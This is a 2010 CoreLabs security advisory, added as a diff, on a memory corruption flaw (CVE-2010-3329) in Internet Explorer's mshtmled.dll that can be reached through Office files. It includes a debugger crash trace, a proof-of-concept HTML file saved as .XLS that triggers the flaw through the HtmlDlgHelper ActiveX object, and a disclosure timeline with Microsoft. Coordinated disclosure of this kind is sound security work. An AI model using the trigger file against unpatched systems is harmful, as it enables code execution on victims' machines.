@@ -1,0 +1,446 @@
+Core Security Technologies - CoreLabs Advisory
+                   http://corelabs.coresecurity.com
+
+  Microsoft Office HtmlDlgHelper class memory corruption
+
+
+1. *Advisory Information*
+
+Title: Microsoft Office HtmlDlgHelper class memory corruption
+Advisory Id: CORE-2010-0517
+Advisory URL:
+[http://www.coresecurity.com/content/MS-Office-HtmlDlgHelper-memory-corruption]
+Date published: 2010-10-12
+Date of last update: 2010-10-14
+Vendors contacted: Microsoft
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Missing Initialization [CWE-456]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2010-3329
+Bugtraq ID: N/A
+
+
+3. *Vulnerability Description*
+
+Microsoft Windows is prone to a memory corruption vulnerability when
+instantiating the 'HtmlDlgHelper Class Object' in a Microsoft Office
+Document (ie: .XLS, .DOC). The affected vulnerable module is part of
+Internet Explorer ('mshtmled.dll'). This vulnerability could be used by
+a remote attacker to execute arbitrary code with the privileges of the
+user that opened the malicious file.
+
+
+4. *Vulnerable packages*
+
+   . IE 6
+   . IE 7
+   . IE 8
+   . MS Office XP
+   . MS Office 2003
+   . MS Office 2007 and MS Office 2010 (the control is disabled by default)
+
+
+5. *Non-vulnerable packages*
+
+   . For further information and patches about this issue look at the
+Microsoft Security Bulletin Summary for October 2010 [1], patch ms10-071.
+
+
+6. *Credits*
+
+This vulnerability was discovered by Damian Frizza from Core Security
+Technologies.
+
+
+7. *Technical Description / Proof of Concept Code*
+
+Microsoft Windows is prone to a memory corruption vulnerability when
+instantiating the 'HtmlDlgHelper Class Object'
+('CLASSID:3050f4e1-98b5-11cf-bb82-00aa00bdce0b') in a Microsoft Office
+Document (ie: .XLS, .DOC). The affected vulnerable module is part of
+Internet Explorer ('mshtmled.dll'). The vulnerability occurs in
+'mshtmled.dll' when the destructor of the 'CHtmlDlgHelper' class is
+called and then makes access to uninitialized memory.
+
+The ActiveX control is marked as "Not Safe for Initialization", and
+prompts the user with: "ActiveX controls might contain viruses or other
+security hazards. Do not enable this content unless you trust the source
+of this file". However, in Office 2003 the bug is triggered even if the
+user answers "No" to the prompt.
+
+The following code is where the vulnerability occurs, when opening a
+.XLS document on Microsoft Office Excel 2003 ('mshtmled.dll'
+v8.0.6001.18702):
+
+/-----
+mshtmled!ReleaseInterface:
+42b919c0 8bff            mov     edi,edi
+42b919c2 55              push    ebp
+42b919c3 8bec            mov     ebp,esp
+42b919c5 8b4508          mov     eax,dword ptr [ebp+8]
+ss:0023:0013d104=00310065
+42b919c8 85c0            test    eax,eax
+42b919ca 7406            je      mshtmled!ReleaseInterface+0x12
+(42b919d2) [br=0]
+42b919cc 8b08            mov     ecx,dword ptr [eax]  ds:0023:00310065
+42b919ce 50              push    eax
+42b919cf ff5108          call    dword ptr [ecx+8]   
+ds:0023:7d02029c=2a2c277a
+
+eax=00310065 ebx=00000000 ecx=7d020294 edx=df0b3d60 esi=001edbdc
+edi=00000000
+eip=2a2c277a esp=0013d0f4 ebp=0013d0fc iopl=0         nv up ei pl nz na
+pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000            
+efl=00000206
+
+Stack Trace:
+<Unloaded_ion.dll>+0x2a2c2779
+mshtmled!ReleaseInterface+0x12
+mshtmled!CHtmlDlgHelper::~CHtmlDlgHelper+0x10
+mshtmled!ATL::CComAggObject<CHtmlDlgHelper>::`scalar deleting
+destructor'+0xd
+mshtmled!ATL::CComAggObject<CHtmlDlgHelper>::Release+0x27
+VBE6!rtcStrConvVar+0xbd65
+VBE6!rtcSetDatabaseLcid+0xa823
+EXCEL!Ordinal41+0xd2ad0
+EXCEL!Ordinal41+0x14082a
+USER32!CallWindowProcW+0x1b
+Instruction Address: 0x000000002a2c277a
+-----/
+
+
+The following html code demonstrates the bug on Excel 2002/2003. Save
+the file as .XLS and open it on Excel.
+
+/-----
+<html xmlns:v="urn:schemas-microsoft-com:vml"
+xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:x="urn:schemas-microsoft-com:office:excel">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Excel.Sheet>
+<meta name=Generator content="Microsoft Excel 10">
+<!--[if !mso]>
+<style>
+v\:* {behavior:url(#default#VML);}
+o\:* {behavior:url(#default#VML);}
+x\:* {behavior:url(#default#VML);}
+.shape {behavior:url(#default#VML);}
+</style>
+<![endif]--><!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:LastAuthor>TEST</o:LastAuthor>
+  <o:LastSaved>2010-08-03T05:19:51Z</o:LastSaved>
+  <o:Version>10.6858</o:Version>
+ </o:DocumentProperties>
+ <o:OfficeDocumentSettings>
+  <o:DownloadComponents/>
+  </o:OfficeDocumentSettings>
+</xml><![endif]-->
+
+<!--[if gte mso 9]><xml>
+ <x:ExcelWorkbook>
+  <x:ExcelWorksheets>
+   <x:ExcelWorksheet>
+    <x:Name>test</x:Name>
+    <x:WorksheetOptions>
+     <x:CodeName>Sheet1</x:CodeName>
+     <x:Selected/>
+     <x:DoNotDisplayGridlines/>
+     <x:ProtectContents>False</x:ProtectContents>
+     <x:ProtectObjects>False</x:ProtectObjects>
+     <x:ProtectScenarios>False</x:ProtectScenarios>
+    </x:WorksheetOptions>
+   </x:ExcelWorksheet>
+  </x:ExcelWorksheets>
+  <x:WindowHeight>9345</x:WindowHeight>
+  <x:WindowWidth>13260</x:WindowWidth>
+  <x:WindowTopX>240</x:WindowTopX>
+  <x:WindowTopY>60</x:WindowTopY>
+  <x:ProtectStructure>False</x:ProtectStructure>
+  <x:ProtectWindows>False</x:ProtectWindows>
+ </x:ExcelWorkbook>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <o:shapedefaults v:ext="edit" spidmax="1026"/>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <o:shapelayout v:ext="edit">
+  <o:idmap v:ext="edit" data="1"/>
+ </o:shapelayout></xml><![endif]-->
+</head>
+
+<body link=blue vlink=purple>
+
+<table x:str border=0 cellpadding=0 cellspacing=0 width=64
+style='border-collapse:
+ collapse;table-layout:fixed;width:48pt'>
+ <col width=64 style='width:48pt'>
+ <tr height=17 style='height:12.75pt'>
+  <td height=17 width=64 style='height:12.75pt;width:48pt' align=left
+  valign=top><!--[if gte vml 1]><v:shapetype id="_x0000_t201"
+coordsize="21600,21600"
+   o:spt="201" path="m,l,21600r21600,l21600,xe">
+   <v:stroke joinstyle="miter"/>
+   <v:path shadowok="f" o:extrusionok="f" strokeok="f" fillok="f"
+    o:connecttype="rect"/>
+   <o:lock v:ext="edit" shapetype="t"/>
+  </v:shapetype><v:shape id="_x0000_s1025" type="#_x0000_t201"
+style='position:absolute;
+   margin-left:0;margin-top:0;width:48pt;height:12.75pt;z-index:1'
+   strokecolor="windowText [64]" o:insetmode="auto">
+   <![if gte mso 9]><o:title=""/>
+   <![endif]><x:ClientData ObjectType="Pict">
+    <x:SizeWithCells/>
+    <x:CF>Pict</x:CF>
+    <x:AutoPict/>
+   </x:ClientData>
+  </v:shape><![endif]--><![if !vml]><span style='mso-ignore:vglayout;
+  position:absolute;z-index:1;margin-left:0px;margin-top:0px;width:64px;
+  height:17px'><![endif]>
+
+<object classid="CLSID:3050F4E1-98B5-11CF-BB82-00AA00BDCE0B"
+id=obj></object>
+
+<![if !vml]></span><![endif]><span
+  style='mso-ignore:vglayout2'>
+  <table cellpadding=0 cellspacing=0>
+   <tr>
+    <td height=17 width=64 style='height:12.75pt;width:48pt'></td>
+   </tr>
+  </table>
+  </span></td>
+ </tr>
+ <![if supportMisalignedColumns]>
+ <tr height=0 style='display:none'>
+  <td width=64 style='width:48pt'></td>
+ </tr>
+ <![endif]>
+</table>
+</body>
+</html>
+
+-----/
+
+
+This exploitable condition was reproduced in the following versions of
+'mshtmled.dll':
+
+   . 'mshtmled.dll' v8.0.6001.18702
+   . 'mshtmled.dll' v8.0.6001.18000
+   . 'mshtmled.dll' v7.0.6000.17023
+   . 'mshtmled.dll' v7.0.6000.17080
+
+
+8. *Report Timeline*
+
+. 2010-05-28:
+Initial notification to the vendor. Draft advisory and proof-of-concept
+files sent to MSRC. Publication date set for July 13, 2010.
+
+. 2010-06-11:
+Core requests from the vendor an update on the status of this case.
+
+. 2010-06-14:
+The vendor responds that its engineers are still investigating this
+issue; and that they expect to have more information from the
+investigation and triage process within the next few days.
+
+. 2010-06-15:
+The vendors informs that they have been determined that the ActiveX
+control is marked as "Not Safe for Initialization"; and prompts the user
+with a dialog that warns the user that they are going to be executing a
+potentially malicious code. In consequence, the vendor treats this case
+as the same scenario as a user that tries to enable and open an Office
+document with a Macro or VBA code contained within.
+
+. 2010-06-15:
+Core asks the vendor if the previous mail means that it does not intent
+to fix the bug or that it does not recognize it as a security issue. The
+reporter's viewpoint is that a dialog prompt is not a fix "per se" and
+just a defense in depth mechanism; and that he would prefer to see the
+bug fixed rather than relying on mitigations that prevent exploitation.
+
+. 2010-06-15:
+Core adds the following information: in Office 2003 even if the user
+answers No to the ActiveX dialog, the application ends up crashing.
+
+. 2010-06-16:
+Vendor responds that it is currently investigating the new information.
+
+. 2010-06-28:
+Vendor informs that it has found that the vulnerable code actually
+exists and is owned by the IE team whom is currently investigating the
+crash; and that this case is transferred over to them (and to a new case
+manager as well).
+
+. 2010-07-02:
+Vendor informs Core that the IE team has finished the investigation into
+this issue and was able to reproduce the issue reported. During the
+investigation it was determined that this is an exploitable crash in
+Internet Explorer. Vendor will send Core the list of affected Internet
+Explorer versions when available.
+
+. 2010-07-02:
+Core acknowledges receipt of the update, and reminds that although the
+vulnerable code is owned by the IE team this also affects Office
+(including 2010). Core offers to postpone publication of its advisory
+from July 13th to August 10th on the basis of a firm commitment to a
+release date from the vendor's side. Core informs that it is evaluating
+the possibility of using Office killbit recently introduced by MS10-036
+as a workaround, but that MS10-036 points to a knowledge base article
+[2] that is no longer available.
+
+. 2010-07-07:
+Vendor acknowledges previous mail, and states that it will determine
+with the product team how this fix could be included in the August
+release. Vendor requests an updated version of the advisory, and to
+include a vendor statement.
+
+. 2010-07-22:
+Core requests an update on the status of the vulnerability report; and
+informs that publication of its advisory has been rescheduled to August
+10, 2010, despite the fact that Core did not receive any updates. Core
+informs that the publication of this advisory is transferred to a new
+case manager.
+
+. 2010-08-04:
+Core sends an updated version of the advisory and also asks if MSRC can
+provide:
+   1. The list of affected software versions.
+   2. The CVE number assigned to this vulnerability (if it exists).
+   3. The steps to reproduce the vulnerability in IE [3].
+   4. The link to the knowledge base article about the newly introduced
+Office killbit given that Core is investigating using that defense
+mechanism as a workaround but MS10-036 points to a knowledge base
+article that is no longer available
+([http://support.microsoft.com/kb/983632]).
+
+ Core also notifies this advisory is currently scheduled to be published
+on August 10, 2010 but the publication can be reviewed if Microsoft
+responds with a firm commitment to a release date of fixes, and
+technical information about the root cause of this vulnerability.
+
+. 2010-08-04:
+MSRC responds that the updated advisory draft was internally forwarded
+and they are working on collecting answers to the requested questions.
+
+. 2010-08-05:
+MSRC sends the answers to the asked questions:
+   1. The affected versions of Internet Explorer are IE6 [4], IE7 and IE8.
+   2. MSRC is unable to assign a CVE as it is too early. CVEs are
+typically assigned closer to the scheduled release date and MSRC will
+receive the block of CVEs from Mitre for the October release of the
+Internet Explorer security update.
+   3. MSRC notifies there is no attack vector in IE, and they cannot
+provide steps to reproduce the vulnerability in IE.
+   4. The knowledge base article about the newly introduced Office
+killbit was redirected to [http://support.microsoft.com/kb/2252664].
+
+. 2010-08-06:
+Core asks MSRC to clarify if the fix for this issue has been scheduled
+to be released in October.
+
+. 2010-08-06:
+MSRC confirms that the fix for this issue is scheduled for the October
+release of IE.
+
+. 2010-08-09:
+Core re-schedules the publication of the advisory for October 12 and
+notifies that this date should be considered as final, if Microsoft does
+not release fixes on that date, the advisory will be released as 'user
+release'.
+
+. 2010-08-09:
+MSRC confirms that the fix for this issue is scheduled for the October
+release of IE.
+
+. 2010-10-01:
+MSRC provides a status update about this issue and notifies that it is
+slated to be included in the October release of the IE Cumulative Update
+and SafeHTML update scheduled for October 12, 2010. MSRC also notifies
+that the CVE assigned to this issue is CVE-2010-3329.
+
+. 2010-10-01:
+MSRC notifies that they have made a mistake and included an invalid
+detail in the last status update. In particular, the issue does not
+affect the SafeHTML update scheduled for October but it will be shipping
+in the IE Cumulative Update scheduled for October.
+
+. 2010-10-01:
+Core acknowledges the MSRC's e-mail and notifies that although the
+problem is located in IE-owned code, the problem also affects Office up
+to 2010. Core assumes this will be specified in the MSRC bulletin and
+asks for confirmation.
+
+. 2010-10-04:
+MSRC confirms that the description of the vulnerability calls out that
+the vector to the vulnerability is through opening a word document.
+
+. 2010-10-12:
+Advisory CORE-2010-0517 is published.
+
+
+9. *References*
+
+[1] Microsoft security bulletin summary for October 2010 -
+[http://www.microsoft.com/technet/security/bulletin/ms10-oct.mspx].
+[2] Office killbit [http://support.microsoft.com/kb/983632].
+[3] This bug was originally investigated in Microsoft Office by Core,
+but MSRC determined [2010-07-02] that this bug is an exploitable crash
+in Internet Explorer.
+[4] MSRC was not able to reproduce this issue on IE6, however they
+notifies the code has been determined to exist in this version and the
+fix will be scoped to address this platform as well.
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+[http://corelabs.coresecurity.com/].
+
+
+11. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+[http://www.coresecurity.com].
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2010 Core Security
+Technologies and (c) 2010 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: [http://creativecommons.org/licenses/by-nc-sa/3.0/us/]
+
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+[http://www.coresecurity.com/files/attachments/core_security_advisories.asc].
